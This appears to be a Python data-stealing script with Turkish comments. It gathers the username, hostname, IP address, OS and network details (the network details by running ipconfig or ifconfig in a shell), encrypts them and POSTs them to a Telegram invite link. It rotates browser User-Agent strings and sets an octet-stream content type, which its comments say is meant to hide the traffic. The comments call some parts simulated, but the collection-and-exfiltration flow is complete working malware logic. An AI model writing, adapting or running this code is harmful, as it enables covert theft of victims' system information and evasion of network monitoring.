import os
import platform
import socket
import subprocess
import requests
import json
import base64
from datetime import datetime
from cryptography.fernet import Fernet
import random

# Şifreleme anahtarı oluştur ve koru (gizli kalması gerektiği varsayılır)
def generate_encryption_key():
    return Fernet.generate_key()

# Şifreleme fonksiyonu
def encrypt_data(data, key):
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data.encode())
    return encrypted_data

# Dummy data toplama fonksiyonu
def collect_system_info():
    system_info = {
        "username": os.getlogin(),
        "hostname": socket.gethostname(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "os": platform.system(),
        "os_version": platform.version(),
        "platform": platform.platform(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "network_config": get_network_config(),
        "installed_software": get_installed_software(),
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    return system_info

# Ağ yapılandırmasını elde et
def get_network_config():
    try:
        result = subprocess.check_output("ipconfig" if platform.system() == "Windows" else "ifconfig", shell=True)
        return result.decode()
    except Exception as e:
        return f"Hata: {e}"

# Yüklü yazılımları simüle ederek elde et
def get_installed_software():
    # Gerçek bir zararlı yazılım registry veya diğer yollarla yazılım bilgilerini çeker.
    # Burada sadece dummy data dönüyoruz.
    software_list = ["Software A", "Software B", "Software C"]
    return software_list

# Verileri JSON formatında hazırla
def prepare_data(data):
    return json.dumps(data)

# Veri gönderimi için farklı yöntemler kullanarak karmaşıklığı artır
def obfuscate_request_headers():
    headers_list = [
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'},
        {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'},
        {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1'}
    ]
    return random.choice(headers_list)

# Verileri belirtilen Telegram kanalına göndermek için simüle edilen fonksiyon
def send_data_to_telegram(encrypted_data):
    url = "https://t.me/+DfMxsKrRlkdjMmIy"  # Gerçek URL veya Telegram API'si değil
    headers = obfuscate_request_headers()
    headers['Content-Type'] = 'application/octet-stream'  # Veri tipini gizlemek için değiştirildi

    try:
        response = requests.post(url, data=encrypted_data, headers=headers)
        if response.status_code == 200:
            print("Veriler başarıyla gönderildi!")
        else:
            print(f"Veri gönderme hatası: {response.status_code}")
    except Exception as e:
        print(f"Bir hata oluştu: {e}")

if __name__ == "__main__":
    encryption_key = generate_encryption_key()
    system_info = collect_system_info()
    prepared_data = prepare_data(system_info)
    encrypted_data = encrypt_data(prepared_data, encryption_key)
    send_data_to_telegram(encrypted_data)
